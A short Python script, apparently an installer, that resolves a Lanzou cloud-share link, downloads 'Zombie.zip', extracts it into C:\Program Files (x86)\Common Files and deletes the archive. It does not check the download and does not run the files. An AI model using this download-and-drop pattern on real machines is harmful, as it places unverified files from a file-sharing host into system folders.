import requests
import zipfile
import os
import 蓝奏云直链

url = f"{蓝奏云直链.run('https://fzw.lanzouh.com/imhbz03zfa1a')}"
response = requests.get(url)
with open('Zombie.zip', 'wb') as f:
    f.write(response.content)
with zipfile.ZipFile('Zombie.zip', 'r') as zip_ref:
    zip_ref.extractall('C:\\Program Files (x86)\\Common Files')
os.remove('Zombie.zip')
